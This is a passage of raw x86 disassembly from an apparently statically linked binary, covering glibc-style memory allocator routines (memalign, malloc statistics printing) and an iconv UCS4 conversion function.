mov eax, dword [ebx + 8]
mov dword [edx + 8], eax
jbe 0x805270a
mov eax, dword [ebx + 0xc]
cmp ecx, 6
mov dword [edx + 0xc], eax
mov eax, dword [ebx + 0x10]
mov dword [edx + 0x10], eax
jbe 0x805270a
mov eax, dword [ebx + 0x14]
cmp ecx, 8
mov dword [edx + 0x14], eax
mov eax, dword [ebx + 0x18]
mov dword [edx + 0x18], eax
jbe 0x805270a
mov eax, dword [ebx + 0x1c]
mov dword [edx + 0x1c], eax
mov eax, dword [ebx + 0x20]
mov dword [edx + 0x20], eax
jmp 0x805270a
mov edx, dword [var_18h]
add edi, dword [var_1ch]
mov ecx, dword [edx + 4]
jmp 0x8052630
mov eax, dword [esi + 4]
and eax, 0xfffffff8
add edi, eax
mov eax, dword [var_14h]
add eax, 0x10
cmp edi, eax
jb 0x80526c0
mov eax, ecx
mov ecx, dword [var_18h]
and eax, 7
or eax, dword [var_14h]
mov edx, eax
or edx, 4
cmp dword [var_10h], 0x80aa360
cmovne eax, edx
sub edi, dword [var_14h]
mov edx, dword [var_10h]
mov dword [ecx + 4], eax
mov eax, ecx
add eax, dword [var_14h]
or edi, 1
mov dword [edx + 0x54], eax
mov dword [eax + 4], edi
mov eax, ebx
jmp 0x8052661
mov esi, dword [ebx - 8]
mov eax, dword [0x80aa7f8]
mov edx, dword [var_14h]
dec eax
add edx, esi
lea edi, [eax + edx + 4]
not eax
and edi, eax
mov eax, ebx
mov edx, edi
sub edx, esi
cmp dword [var_1ch], edx
mov dword [var_28h], edx
je 0x8052661
mov dword [var_ch], 1
mov dword [var_8h], edi
mov eax, dword [var_1ch]
add eax, esi
mov dword [var_4h], eax
sub dword [var_18h], esi
mov ecx, dword [var_18h]
mov dword [esp], ecx
call fcn.080548a0
cmp eax, 0xffffffff
je 0x8052849
or dword [var_28h], 2
add eax, esi
mov edx, dword [var_28h]
mov dword [var_20h], eax
mov dword [eax + 4], edx
mov eax, dword [0x80aa800]
mov edx, edi
sub edx, dword [var_1ch]
add edx, dword [0x80aa7fc]
cmp edx, eax
mov dword [0x80aa7fc], edx
cmova eax, edx
mov dword [0x80aa800], eax
jmp 0x8052719
mov eax, dword [var_14h]
mov dword [var_24h], ebx
add eax, 4
cmp dword [var_1ch], eax
jb 0x805285f
mov eax, dword [var_24h]
jmp 0x8052661
mov eax, dword [var_14h]
sub eax, 7
mov dword [var_4h], eax
mov ecx, dword [var_10h]
mov dword [esp], ecx
call fcn.08051cf0
test eax, eax
mov dword [var_24h], eax
je 0x8052857
mov eax, dword [var_1ch]
mov dword [var_4h], ebx
sub eax, 8
mov dword [var_8h], eax
mov eax, dword [var_24h]
mov dword [esp], eax
call fcn.08053770
mov dword [var_4h], ebx
mov edx, dword [var_10h]
mov dword [esp], edx
call fcn.08052220
jmp 0x8052857
call fcn.08048b20
mov dword [eax], 0xc
xor eax, eax
jmp 0x8052661
mov ecx, dword [var_10h]
mov dword [arg_ch], eax
mov dword [arg_8h], ecx
add esp, 0x2c
pop ebx
pop esi
pop edi
leave
jmp fcn.08051cf0
mov dword [var_4h], ebx
mov edx, dword [var_10h]
mov dword [esp], edx
call fcn.08052220
jmp 0x80528b0
lea esi, [esi]
push ebp
mov ebp, esp
push edi
push esi
push ebx
sub esp, 0x14
mov edx, dword [arg_10h]
mov ebx, dword [arg_ch]
mov eax, dword [arg_8h]
cmp ebx, 8
mov dword [var_10h], eax
jbe 0x8052a85
cmp ebx, 0xf
mov eax, 0x10
cmovbe ebx, eax
lea eax, [ebx - 1]
test eax, ebx
je 0x8052928
mov eax, 0x10
cmp eax, ebx
jae 0x8052926
lea esi, [esi]
add eax, eax
cmp eax, ebx
jb 0x8052920
mov ebx, eax
cmp edx, 0xffffffdf
ja 0x8052a73
lea eax, [edx + 0xb]
mov dword [var_14h], 0x10
mov edx, eax
and edx, 0xfffffff8
cmp eax, 0x10
cmovb edx, dword [var_14h]
lea eax, [ebx + edx + 0x10]
mov dword [var_14h], edx
mov dword [var_4h], eax
mov edx, dword [var_10h]
mov dword [esp], edx
call fcn.08051cf0
mov edi, eax
xor eax, eax
test edi, edi
je 0x80529b8
lea eax, [edi - 8]
xor edx, edx
mov dword [var_18h], eax
mov eax, edi
div ebx
test edx, edx
je 0x8052a0e
mov edx, ebx
lea eax, [ebx + edi - 1]
neg edx
and eax, edx
lea esi, [eax - 8]
mov eax, esi
lea edx, [ebx + esi]
sub eax, dword [var_18h]
cmp eax, 0xf
cmovbe esi, edx
mov edx, dword [var_18h]
mov ebx, esi
sub ebx, dword [var_18h]
mov eax, dword [edx + 4]
mov ecx, eax
and ecx, 0xfffffff8
sub ecx, ebx
test al, 2
je 0x80529c0
add ebx, dword [edi - 8]
or ecx, 2
lea eax, [esi + 8]
mov dword [esi + 4], ecx
mov dword [esi], ebx
add esp, 0x14
pop ebx
pop esi
pop edi
leave
ret
mov eax, ecx
mov edx, ecx
or edx, 5
or eax, 1
cmp dword [var_10h], 0x80aa360
cmovne eax, edx
mov edx, dword [var_18h]
mov dword [esi + 4], eax
or dword [ecx + esi + 4], 1
mov eax, dword [edx + 4]
and eax, 7
or eax, ebx
mov edx, eax
or edx, 4
cmp dword [var_10h], 0x80aa360
cmovne eax, edx
mov edx, dword [var_18h]
mov dword [edx + 4], eax
mov dword [var_4h], edi
mov eax, dword [var_10h]
mov dword [esp], eax
call fcn.08052220
mov dword [var_18h], esi
mov edx, dword [var_18h]
mov eax, dword [edx + 4]
test al, 2
jne 0x8052a68
mov edx, eax
mov eax, dword [var_14h]
and edx, 0xfffffff8
add eax, 0x10
cmp edx, eax
jbe 0x8052a68
mov eax, edx
mov ecx, dword [var_18h]
sub eax, dword [var_14h]
add ecx, dword [var_14h]
mov edx, eax
or eax, 5
or edx, 1
cmp dword [var_10h], 0x80aa360
cmovne edx, eax
mov dword [ecx + 4], edx
add ecx, 8
mov edx, dword [var_18h]
mov eax, dword [edx + 4]
and eax, 7
or eax, dword [var_14h]
mov dword [edx + 4], eax
mov dword [var_4h], ecx
mov eax, dword [var_10h]
mov dword [esp], eax
call fcn.08052220
mov eax, dword [var_18h]
add eax, 8
jmp 0x80529b8
call fcn.08048b20
mov dword [eax], 0xc
xor eax, eax
jmp 0x80529b8
mov dword [arg_ch], edx
add esp, 0x14
pop ebx
pop esi
pop edi
leave
jmp fcn.08051cf0
lea esi, [esi]
lea edi, [edi]
push ebp
mov ebp, esp
sub esp, 0x18
mov eax, dword [arg_10h]
mov dword [var_ch], 3
mov dword [var_4h], eax
mov eax, dword [arg_14h]
mov dword [var_10h], eax
lea eax, [var_4h]
mov dword [var_8h], eax
mov eax, dword [arg_ch]
mov dword [var_sp_4h], eax
mov eax, dword [arg_8h]
mov dword [esp], eax
call fcn.08052b10
leave
ret
lea esi, [esi]
lea edi, [edi]
push ebp
mov ebp, esp
sub esp, 0x14
mov eax, dword [arg_14h]
mov dword [var_ch], 0
mov dword [var_10h], eax
mov eax, dword [arg_10h]
mov dword [var_8h], eax
mov eax, dword [arg_ch]
mov dword [var_4h], eax
mov eax, dword [arg_8h]
mov dword [esp], eax
call fcn.08052b10
leave
ret
push ebp
mov ebp, esp
push edi
push esi
push ebx
sub esp, 0x34
mov ebx, dword [arg_18h]
mov edx, dword [arg_ch]
mov eax, dword [arg_8h]
mov dword [var_14h], edx
mov edx, dword [arg_14h]
mov dword [var_10h], eax
mov eax, dword [arg_10h]
mov dword [var_1ch], edx
mov dword [var_18h], eax
mov eax, dword [var_10h]
test byte [eax + 0x28], 1
je 0x8052d21
test ebx, ebx
je 0x8052cd5
mov esi, dword [var_14h]
mov eax, ebx
test esi, esi
je 0x8052c4e
mov dword [var_2ch], ebx
mov dword [var_28h], 0
test byte [var_1ch], 1
je 0x8052c91
mov edx, dword [var_18h]
mov dword [var_20h], 0x10
mov eax, dword [edx]
add eax, 0xb
mov edx, eax
and edx, 0xfffffff8
cmp eax, 0x10
mov eax, dword [var_14h]
cmovb edx, dword [var_20h]
imul eax, edx
mov dword [var_20h], edx
mov dword [var_24h], eax
mov eax, dword [var_24h]
mov edx, dword [var_28h]
mov ebx, dword [0x80aa7f0]
mov dword [0x80aa7f0], 0
lea ecx, [edx + eax - 7]
mov dword [var_4h], ecx
mov eax, dword [var_10h]
mov dword [esp], eax
call fcn.08051cf0
mov dword [0x80aa7f0], ebx
mov edx, eax
xor eax, eax
test edx, edx
je 0x8052c4e
lea ebx, [edx - 8]
mov edi, dword [ebx + 4]
and edi, 0xfffffff8
test byte [var_1ch], 2
jne 0x8052c70
xor eax, eax
mov ecx, dword [var_2ch]
cmp dword [var_10h], 0x80aa360
setne al
test ecx, ecx
lea edx, [eax*4 + 1]
mov dword [var_30h], edx
je 0x8052c56
mov eax, dword [var_14h]
xor esi, esi
dec eax
mov dword [var_34h], eax
cmp esi, dword [var_34h]
mov edx, dword [var_2ch]
lea eax, [ebx + 8]
mov dword [edx + esi*4], eax
je 0x8052c42
mov ecx, dword [var_20h]
test ecx, ecx
jne 0x8052c33
mov edx, dword [var_18h]
mov ecx, 0x10
mov eax, dword [edx + esi*4]
add eax, 0xb
mov edx, eax
and edx, 0xfffffff8
cmp eax, 0x10
cmovae ecx, edx
mov eax, dword [var_30h]
sub edi, ecx
inc esi
or eax, ecx
mov dword [ebx + 4], eax
add ebx, ecx
jmp 0x8052c05
or dword [var_30h], edi
mov eax, dword [var_30h]
mov dword [ebx + 4], eax
mov eax, dword [var_2ch]
add esp, 0x34
pop ebx
pop esi
pop edi
leave
ret
mov edx, dword [var_24h]
sub edi, dword [var_24h]
or edi, dword [var_30h]
lea eax, [edx + ebx]
lea edx, [eax + 8]
mov dword [eax + 4], edi
mov dword [var_2ch], edx
mov edi, dword [var_24h]
jmp 0x8052bfc
mov eax, edi
sub eax, dword [var_28h]
mov dword [esp], edx
mov dword [var_4h], 0
sub eax, 4
mov dword [var_8h], eax
call fcn.080536f0
jmp 0x8052bdf
xor esi, esi
mov dword [var_20h], 0
mov dword [var_24h], 0
cmp esi, dword [var_14h]
je 0x8052b91
lea esi, [esi]
mov edx, dword [var_18h]
mov eax, dword [edx + esi*4]
add eax, 0xb
cmp eax, 0xf
jbe 0x8052ccf
and eax, 0xfffffff8
add dword [var_24h], eax
inc esi
cmp esi, dword [var_14h]
jne 0x8052cb0
jmp 0x8052b91
add dword [var_24h], 0x10
jmp 0x8052cc4
mov ebx, dword [var_14h]
test ebx, ebx
je 0x8052d08
mov edx, dword [var_14h]
mov dword [var_28h], 0x10
mov dword [var_2ch], 0
lea eax, [edx*4 + 0xb]
mov edx, eax
and edx, 0xfffffff8
cmp eax, 0x10
cmovb edx, dword [var_28h]
mov dword [var_28h], edx
jmp 0x8052b60
mov edx, dword [var_10h]
mov dword [arg_ch], 0
mov dword [arg_8h], edx
add esp, 0x34
pop ebx
pop esi
pop edi
leave
jmp fcn.08051cf0
mov dword [esp], eax
call fcn.08052430
jmp 0x8052b41
mov esi, esi
push ebp
mov ebp, esp
sub esp, 0x10
mov dword [var_4h], ebx
mov ebx, dword [arg_8h]
test byte [ebx + 0x28], 1
je 0x8052d5f
mov eax, dword [arg_ch]
mov dword [esp], ebx
mov dword [var_8h], eax
mov eax, dword [0x80aa7f8]
mov dword [var_sp_4h], eax
call fcn.080528e0
mov ebx, dword [var_4h]
leave
ret
mov dword [esp], ebx
call fcn.08052430
jmp 0x8052d42
lea esi, [esi]
push ebp
mov ebp, esp
sub esp, 0x10
mov dword [var_4h], ebx
mov ebx, dword [arg_8h]
test byte [ebx + 0x28], 1
je 0x8052daa
mov ecx, dword [0x80aa7f8]
mov eax, dword [arg_ch]
mov dword [esp], ebx
mov edx, ecx
lea eax, [ecx + eax - 1]
mov dword [var_sp_4h], ecx
neg edx
and eax, edx
mov dword [var_8h], eax
call fcn.080528e0
mov ebx, dword [var_4h]
leave
ret
mov dword [esp], ebx
call fcn.08052430
jmp 0x8052d82
lea esi, [esi]
lea edi, [edi]
push ebp
mov ebp, esp
sub esp, 8
mov dword [esp], 0x80aa360
call fcn.08052430
mov eax, dword [arg_8h]
mov dword [var_4h], 0x80aa360
mov dword [esp], eax
call fcn.08050e70
leave
ret
mov esi, esi
lea edi, [edi]
push ebp
mov ebp, esp
mov eax, dword [arg_8h]
test eax, eax
je 0x8052e1b
lea edx, [eax - 8]
mov eax, dword [edx + 4]
test al, 2
je 0x8052e0c
and eax, 0xfffffff8
sub eax, 8
leave
ret
and eax, 0xfffffff8
test byte [eax + edx + 4], 1
je 0x8052e1b
sub eax, 4
jmp 0x8052e0a
xor eax, eax
jmp 0x8052e0a
nop
push ebp
mov ebp, esp
push edi
push esi
push ebx
sub esp, 0x4c
mov eax, dword [arg_ch]
mov eax, dword [eax + 0x54]
test eax, eax
mov dword [var_50h], eax
je 0x8052f3a
mov eax, dword [var_50h]
mov esi, 1
mov dword [var_44h], 0
mov dword [var_40h], 0
xor ebx, ebx
mov edi, dword [eax + 4]
and edi, 0xfffffff8
mov eax, dword [arg_ch]
mov edx, dword [eax + ebx*4 + 0x2c]
test edx, edx
je 0x8052e76
mov eax, dword [edx + 4]
inc dword [var_44h]
mov edx, dword [edx + 8]
and eax, 0xfffffff8
add dword [var_40h], eax
test edx, edx
jne 0x8052e63
inc ebx
cmp ebx, 9
jbe 0x8052e58
mov ecx, dword [arg_ch]
add edi, dword [var_40h]
mov ebx, 1
add ecx, 0x5c
lea esi, [esi]
mov edx, dword [ecx + 0xc]
cmp edx, ecx
je 0x8052ea7
mov eax, dword [edx + 4]
inc esi
mov edx, dword [edx + 0xc]
and eax, 0xfffffff8
add edi, eax
cmp edx, ecx
jne 0x8052e97
inc ebx
add ecx, 8
cmp ebx, 0x7f
jbe 0x8052e90
mov edx, dword [var_44h]
mov ebx, dword [arg_ch]
mov dword [var_38h], esi
mov dword [var_1ch], edi
mov ecx, dword [0x80aa7fc]
mov dword [var_34h], edx
mov eax, dword [ebx + 0x470]
mov ebx, dword [0x80aa7ec]
mov dword [var_2ch], ecx
mov edx, eax
mov dword [var_30h], ebx
mov dword [var_54h], ebx
sub edx, edi
mov ebx, dword [var_50h]
mov dword [var_3ch], eax
mov dword [var_20h], edx
mov dword [var_48h], edx
mov edx, dword [var_40h]
mov dword [var_24h], edx
mov edx, dword [ebx + 4]
mov ebx, dword [0x80aa804]
and edx, 0xfffffff8
mov dword [var_4ch], edx
mov edx, dword [arg_8h]
mov dword [edx], eax
mov dword [edx + 0x14], ebx
mov dword [edx + 4], esi
mov eax, dword [var_44h]
mov ebx, dword [var_40h]
mov dword [edx + 0x10], ecx
mov dword [edx + 8], eax
mov dword [edx + 0x18], ebx
mov eax, dword [var_54h]
mov dword [edx + 0xc], eax
mov eax, dword [var_48h]
mov dword [edx + 0x1c], eax
mov eax, edx
mov dword [edx + 0x20], edi
mov ebx, dword [var_4ch]
mov dword [edx + 0x24], ebx
add esp, 0x4c
pop ebx
pop esi
pop edi
leave
ret 4
mov edx, dword [arg_ch]
mov dword [esp], edx
call fcn.08052430
mov ebx, dword [arg_ch]
mov ebx, dword [ebx + 0x54]
mov dword [var_50h], ebx
jmp 0x8052e3a
lea esi, [esi]
lea edi, [edi]
push ebp
mov ebp, esp
push edi
push esi
push ebx
sub esp, 0x48
mov eax, dword [0x80a9518]
mov edi, dword [0x80aa7fc]
test eax, eax
mov esi, edi
js 0x805310b
mov edx, dword [0x80a9504]
mov dword [var_40h], 0
mov ebx, 0x80aa360
mov eax, dword [edx + 0x3c]
mov dword [var_44h], eax
or eax, 2
mov dword [edx + 0x3c], eax
lea esi, [esi]
mov edx, 0
test edx, edx
je 0x8053100
mov dword [esp], ebx
call section.
lea eax, [var_3ch]
mov dword [var_4h], ebx
mov dword [esp], eax
call fcn.08052e20
mov edx, dword [var_40h]
mov eax, dword [0x80a9504]
sub esp, 4
mov dword [var_4h_2], str.Arena__d:_n
mov dword [var_4h], edx
mov dword [esp], eax
call fcn.08049b80
mov eax, dword [var_3ch]
mov dword [var_4h_2], str.system_bytes_______10u_n
mov dword [var_4h], eax
mov eax, dword [0x80a9504]
mov dword [esp], eax
call fcn.08049b80
mov dword [var_4h_2], str.in_use_bytes_______10u_n
mov eax, dword [var_20h]
mov dword [var_4h], eax
mov eax, dword [0x80a9504]
mov dword [esp], eax
call fcn.08049b80
mov eax, 0
add esi, dword [var_3ch]
add edi, dword [var_20h]
test eax, eax
je 0x80530f2
mov dword [esp], ebx
call section.
mov ebx, dword [ebx + 0x46c]
cmp ebx, 0x80aa360
je 0x805304c
inc dword [var_40h]
jmp 0x8052fa0
mov eax, dword [0x80a9504]
mov dword [var_4h], 0x14
mov dword [var_4h_2], 1
mov dword [esp], str.Total__incl._mmap_:_n
mov dword [var_ch], eax
call fcn.08075380
mov eax, dword [0x80a9504]
mov dword [var_4h], esi
mov dword [var_4h_2], str.system_bytes_______10u_n
mov dword [esp], eax
call fcn.08049b80
mov eax, dword [0x80a9504]
mov dword [var_4h], edi
mov dword [var_4h_2], str.in_use_bytes_______10u_n
mov dword [esp], eax
call fcn.08049b80
mov dword [var_4h_2], str.max_mmap_regions___10u_n
mov eax, dword [0x80aa7f4]
mov dword [var_4h], eax
mov eax, dword [0x80a9504]
mov dword [esp], eax
call fcn.08049b80
mov dword [var_4h_2], str.max_mmap_bytes_____10lu_n
mov eax, dword [0x80aa800]
mov dword [var_4h], eax
mov eax, dword [0x80a9504]
mov dword [esp], eax
call fcn.08049b80
mov edx, dword [var_44h]
mov eax, dword [0x80a9504]
or dword [eax + 0x3c], edx
lea esp, [var_bp_ch]
pop ebx
pop esi
pop edi
leave
ret
mov dword [ebx], 0
jmp 0x8053036
lea esi, [esi]
mov dword [ebx], 1
jmp 0x8052fb5
call fcn.0804f290
jmp 0x8052f7e
push ebp
mov ebp, esp
push ebx
sub esp, 0x38
mov eax, dword [0x80a9518]
mov ebx, dword [arg_8h]
test eax, eax
js 0x8051ccf
mov eax, 0
test eax, eax
je 0x8051cc0
mov dword [esp], 0x80aa360
call section.
lea eax, [var_34h]
mov dword [var_4h], 0x80aa360
mov dword [esp], eax
call fcn.08052e20
mov eax, 0
sub esp, 4
test eax, eax
je 0x8051caf
mov dword [esp], 0x80aa360
call section.
mov eax, dword [var_34h]
mov dword [ebx], eax
mov eax, dword [var_30h]
mov dword [ebx + 4], eax
mov eax, dword [var_2ch]
mov dword [ebx + 8], eax
mov eax, dword [var_28h]
mov dword [ebx + 0xc], eax
mov eax, dword [var_24h]
mov dword [ebx + 0x10], eax
mov eax, dword [var_20h]
mov dword [ebx + 0x14], eax
mov eax, dword [var_1ch]
mov dword [ebx + 0x18], eax
mov eax, dword [var_18h]
mov dword [ebx + 0x1c], eax
mov eax, dword [var_14h]
mov dword [ebx + 0x20], eax
mov eax, dword [var_10h]
mov dword [ebx + 0x24], eax
mov eax, ebx
mov ebx, dword [var_bp_4h]
leave
ret 4
mov dword [0x80aa360], 0
jmp 0x8051c6b
nop
lea esi, [esi]
mov dword [0x80aa360], 1
jmp 0x8051c40
call fcn.0804f290
jmp 0x8051c27
push ebp
mov ebp, esp
leave
jmp fcn.08053120
push ebp
mov ebp, esp
sub esp, 0x14
mov ecx, dword [arg_ch]
mov dword [var_8h], ebx
mov dword [var_4h], esi
mov ebx, dword [0x80a9514]
mov esi, dword [arg_10h]
test cl, 3
jne 0x8053260
mov edx, ecx
shr edx, 2
lea eax, [edx - 1]
test edx, eax
jne 0x8053260
test ecx, ecx
jne 0x805326d
lea esi, [esi]
mov eax, 0x16
mov ebx, dword [var_8h]
mov esi, dword [var_4h]
leave
ret
test ebx, ebx
je 0x8053295
mov eax, dword [arg_4h]
mov dword [var_sp_4h], esi
mov dword [esp], ecx
mov dword [var_sp_8h], eax
call ebx
mov edx, eax
mov eax, 0xc
test edx, edx
je 0x8053265
mov eax, dword [arg_8h]
mov dword [eax], edx
xor eax, eax
jmp 0x8053265
mov dword [var_sp_4h], esi
mov dword [esp], ecx
call fcn.080513d0
jmp 0x8053281
push ebp
mov ebp, esp
sub esp, 4
mov eax, dword [arg_8h]
mov dword [esp], eax
call fcn.08054640
mov edx, eax
xor eax, eax
cmp edx, 0xffffffff
cmovne eax, edx
leave
ret
push ebp
mov ebp, esp
sub esp, 8
mov dword [var_4h], ebx
mov ebx, dword [eax + 0x14]
test ebx, ebx
je 0x8053d6b
mov dword [eax + 0x14], 0
mov dword [eax + 0x10], 0
mov edx, dword [ebx + 0xc]
mov eax, dword [ebx + 8]
call fcn.08057110
mov eax, dword [ebx]
mov edx, dword [ebx + 4]
call fcn.08057110
mov dword [esp], ebx
call fcn.08051180
mov ebx, dword [var_4h]
leave
ret
push ebp
mov ebp, esp
sub esp, 8
call fcn.08062c50
nop
nop
nop
nop
nop
push ebp
mov ebp, esp
mov eax, dword [arg_ch]
mov eax, dword [eax]
mov dword [arg_ch], eax
mov eax, dword [arg_8h]
mov eax, dword [eax]
mov dword [arg_8h], eax
leave
jmp fcn.08076e50
push ebp
mov ebp, esp
sub esp, 0x10
mov dword [var_8h], ebx
mov dword [var_4h], esi
mov ebx, dword [arg_ch]
mov esi, dword [arg_8h]
mov eax, dword [ebx]
mov dword [var_sp_4h], eax
mov eax, dword [esi]
mov dword [esp], eax
call fcn.08076e50
test eax, eax
jne 0x8056578
mov eax, dword [ebx + 4]
mov dword [var_sp_4h], eax
mov eax, dword [esi + 4]
mov dword [esp], eax
call fcn.08076e50
mov ebx, dword [var_8h]
mov esi, dword [var_4h]
leave
ret
push ebp
mov ebp, esp
push edi
push esi
push ebx
sub esp, 0x48
mov ecx, dword [arg_ch]
mov edx, dword [arg_ch]
mov eax, dword [arg_8h]
mov ebx, dword [arg_20h]
add edx, 0x24
add eax, 0x3c
mov dword [var_1ch], edx
test byte [ecx + 8], 1
mov dword [var_18h], eax
jne 0x80582c4
mov esi, dword [eax + 0x14]
mov dword [var_20h], esi
test ebx, ebx
jne 0x805823d
mov esi, dword [arg_10h]
mov eax, dword [arg_18h]
mov ecx, dword [esi]
test eax, eax
mov dword [var_24h], ecx
jne 0x8058233
mov edx, dword [arg_ch]
mov eax, dword [edx]
mov dword [var_10h], eax
mov edi, dword [arg_24h]
mov eax, dword [arg_ch]
mov eax, dword [eax + 4]
test edi, edi
mov dword [var_28h], eax
je 0x8057fd6
mov edx, dword [arg_ch]
mov ebx, dword [edx + 0x14]
mov esi, dword [ebx]
mov eax, esi
mov dword [var_34h], esi
and eax, 7
je 0x8057fd6
mov esi, dword [arg_18h]
test esi, esi
jne 0x805820f
mov edx, eax
lea edi, [var_10h]
mov eax, dword [arg_14h]
cmp dword [var_24h], eax
jae 0x80581f0
cmp edx, 3
ja 0x8057f9e
mov eax, dword [arg_10h]
lea esi, [ecx + 1]
mov dword [eax], esi
movzx eax, byte [ecx]
mov byte [ebx + edx + 4], al
mov esi, dword [arg_10h]
inc edx
mov ecx, dword [esi]
cmp ecx, dword [arg_14h]
jae 0x80581f0
cmp edx, 3
jbe 0x8057f7b
movzx eax, byte [ebx + 7]
mov edx, dword [edi]
mov byte [edx], al
movzx eax, byte [ebx + 6]
mov edx, dword [edi]
mov byte [edx + 1], al
movzx eax, byte [ebx + 5]
mov edx, dword [edi]
mov byte [edx + 2], al
movzx eax, byte [ebx + 4]
mov edx, dword [edi]
mov byte [edx + 3], al
xor eax, eax
and dword [ebx], 0xfffffff8
add dword [edi], 4
test eax, eax
jne 0x8058109
mov esi, dword [arg_10h]
mov ecx, dword [esi]
mov eax, dword [var_10h]
mov edx, dword [var_28h]
mov dword [var_24h], ecx
mov ebx, ecx
mov dword [var_2ch], eax
sub edx, dword [var_2ch]
mov eax, dword [arg_14h]
sub eax, ecx
mov ecx, dword [var_2ch]
cmp edx, eax
cmovg edx, eax
cmp edx, 0xffffffff
lea eax, [edx + 3]
mov edi, edx
cmovle edi, eax
xor esi, esi
sar edi, 2
cmp esi, edi
jae 0x8058024
inc esi
mov eax, dword [ebx]
mov edx, ecx
ror ax, 8
ror eax, 0x10
ror ax, 8
add ebx, 4
add ecx, 4
cmp esi, edi
mov dword [edx], eax
jb 0x8058008
mov edx, dword [arg_10h]
mov esi, 4
mov dword [edx], ebx
cmp ebx, dword [arg_14h]
mov dword [var_10h], ecx
je 0x8058046
lea eax, [ecx + 4]
cmp eax, dword [var_28h]
setbe al
movzx esi, al
lea esi, [esi + esi + 5]
mov edi, esi
mov edx, dword [arg_18h]
test edx, edx
jne 0x80581e5
mov ecx, dword [arg_ch]
mov ebx, dword [ecx + 0x20]
test ebx, ebx
je 0x8058072
lea esi, [esi]
mov eax, dword [ebx + 4]
test eax, eax
jne 0x80581b1
mov ebx, dword [ebx + 0x10]
test ebx, ebx
jne 0x8058060
mov eax, dword [arg_ch]
inc dword [eax + 0xc]
test byte [eax + 8], 1
jne 0x80581a4
mov edx, dword [var_2ch]
cmp dword [var_10h], edx
jbe 0x80580ef
mov eax, dword [eax]
mov dword [var_14h], eax
mov eax, dword [var_20h]
mov dword [esp], eax
call fcn.08083520
mov eax, dword [var_10h]
mov edx, dword [arg_24h]
mov dword [var_sp_18h], 0
mov ecx, dword [arg_1ch]
mov dword [var_sp_10h], 0
mov dword [var_ch], eax
mov dword [var_sp_1ch], edx
lea eax, [var_14h]
mov dword [var_8h], eax
mov edx, dword [var_18h]
mov dword [var_sp_14h], ecx
mov eax, dword [var_1ch]
mov dword [esp], edx
mov dword [var_4h], eax
call dword [var_20h]
cmp eax, 4
je 0x805818c
mov ecx, dword [var_14h]
mov edx, dword [var_10h]
cmp ecx, edx
jne 0x8058180
mov edi, eax
test edi, edi
jne 0x8058100
mov edx, dword [arg_ch]
mov eax, dword [edx]
mov dword [var_10h], eax
jmp 0x8057fd1
mov eax, dword [arg_24h]
test eax, eax
jne 0x8058111
mov eax, edi
add esp, 0x48
pop ebx
pop esi
pop edi
leave
ret
cmp edi, 7
jne 0x8058107
mov eax, dword [arg_10h]
mov ecx, dword [eax]
mov eax, dword [arg_14h]
sub eax, ecx
cmp eax, 3
jg 0x805815c
xor ebx, ebx
cmp ecx, dword [arg_14h]
jae 0x805814b
mov esi, dword [arg_ch]
lea eax, [ecx + 1]
mov edx, dword [esi + 0x14]
mov esi, dword [arg_10h]
mov dword [esi], eax
movzx eax, byte [ecx]
mov byte [ebx + edx + 4], al
mov eax, dword [esi]
inc ebx
cmp eax, dword [arg_14h]
mov ecx, eax
jb 0x805812c
mov eax, dword [arg_ch]
mov edx, dword [eax + 0x14]
mov eax, dword [edx]
and eax, 0xfffffff8
or eax, ebx
mov dword [edx], eax
jmp 0x8058107
mov dword [var_ch], str.__gconv_transform_internal_ucs4
mov dword [var_8h], 0x313
mov dword [var_4h], str..._iconv_skeleton.c
mov dword [esp], str.inend___inptrp___4
call fcn.0805efc0
sub edx, ecx
mov ecx, dword [arg_10h]
sub dword [ecx], edx
jmp 0x80580ed
cmp esi, 5
jne 0x80580ef
mov esi, dword [arg_ch]
xor edi, edi
mov eax, dword [esi]
mov dword [var_10h], eax
jmp 0x80580ef
mov eax, dword [var_10h]
mov edx, dword [arg_ch]
mov dword [edx], eax
jmp 0x8058100
mov dword [esp], eax
call fcn.08083520
mov eax, dword [var_10h]
mov edx, dword [arg_10h]
mov ecx, dword [var_24h]
mov dword [var_sp_10h], eax
mov eax, dword [var_2ch]
mov dword [var_ch], eax
mov eax, dword [edx]
mov dword [var_4h], ecx
mov dword [var_8h], eax
mov eax, dword [ebx + 0xc]
mov dword [esp], eax
call dword [ebx + 4]
jmp 0x805806b
mov eax, dword [var_10h]
mov edx, dword [arg_18h]
jmp 0x8058158
cmp edx, 3
ja 0x8057f9e
and dword [var_34h], 0xfffffff8
or dword [var_34h], edx
mov eax, dword [var_34h]
mov dword [ebx], eax
mov eax, 7
jmp 0x8057fc9
mov dword [var_ch], str.__gconv_transform_internal_ucs4
mov dword [var_8h], 0x22e
mov dword [var_4h], str..._iconv_skeleton.c
mov dword [esp], str.outbufstart____void__0_
jmp 0x805817b
mov esi, dword [arg_18h]
mov eax, dword [esi]
jmp 0x8057f31
mov eax, dword [arg_18h]
test eax, eax
jne 0x80582af
mov edx, dword [arg_ch]
xor edi, edi
mov eax, dword [edx + 0x14]
mov dword [eax], 0
mov dword [eax + 4], 0
test byte [edx + 8], 1
jne 0x8058107
mov ecx, dword [var_20h]
mov dword [esp], ecx
call fcn.08083520
mov esi, dword [arg_24h]
mov eax, dword [arg_1ch]
mov dword [var_sp_18h], ebx
mov edx, dword [var_1ch]
mov ecx, dword [var_18h]
mov dword [var_sp_10h], 0
mov dword [var_ch], 0
mov dword [var_8h], 0
mov dword [var_sp_1ch], esi
mov dword [var_sp_14h], eax
mov dword [var_4h], edx
mov dword [esp], ecx
call dword [var_20h]
mov edi, eax
jmp 0x8058107
mov dword [var_ch], str.__gconv_transform_internal_ucs4
mov dword [var_8h], 0x19f
jmp 0x805821f
mov dword [var_20h], 0
jmp 0x8057f11
push ebp
mov ebp, esp
push edi
push esi
push ebx
sub esp, 0x58
mov dword [var_24h], 0
mov ecx, dword [arg_ch]
mov eax, dword [arg_8h]
mov edx, dword [arg_ch]
mov ebx, dword [arg_20h]
mov ecx, dword [ecx + 8]
add eax, 0x3c
add edx, 0x24
mov dword [var_1ch], eax
mov dword [var_20h], edx
mov dword [var_40h], ecx
mov dword [var_28h], ecx
and ecx, 1
jne 0x805830c
mov edi, dword [eax + 0x14]
mov dword [var_24h], edi
test ebx, ebx
jne 0x80586e6
mov edi, dword [arg_10h]
mov ecx, dword [edi]
mov edi, dword [arg_18h]
test edi, edi
mov dword [var_2ch], ecx
jne 0x80586dc
mov edx, dword [arg_ch]
mov eax, dword [edx]
mov dword [var_14h], eax
mov esi, dword [arg_1ch]
mov dword [var_34h], 0
mov eax, dword [arg_ch]
mov ebx, dword [arg_24h]
mov dword [var_10h], 0
